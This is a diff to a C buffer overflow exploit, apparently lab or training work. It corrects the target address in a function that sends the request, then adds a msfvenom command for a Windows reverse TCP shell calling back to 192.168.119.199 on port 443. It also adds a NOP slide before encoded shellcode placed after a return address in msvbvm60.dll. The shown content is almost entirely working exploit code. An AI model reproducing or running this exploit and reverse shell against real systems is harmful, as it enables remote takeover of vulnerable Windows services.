@@ -33,7 +33,7 @@ DWORD SendRequest(char *request, int request_size) {
     }
 
     printf("[>] Socket created.\n");
-    server.sin_addr.s_addr = inet_addr("192.168.199.10.");
+    server.sin_addr.s_addr = inet_addr("192.168.199.10");
     server.sin_family = AF_INET;
     server.sin_port = htons(80);
 
@@ -73,7 +73,10 @@ void EvilRequest() {
     memset(padding + initial_buffer_size - 1, 0x00, 1);
     unsigned char retn[] = "\x83\x0c\x09\x10"; //ret at msvbvm60.dll
 
+    //msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+
     unsigned char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
     "\xd9\xcd\xd9\x74\x24\xf4\xbb\x76\x4e\xbf\xc6\x58\x33\xc9\xb1"
     "\x52\x83\xc0\x04\x31\x58\x13\x03\x2e\x5d\x5d\x33\x32\x89\x23"
     "\xbc\xca\x4a\x44\x34\x2f\x7b\x44\x22\x24\x2c\x74\x20\x68\xc1"
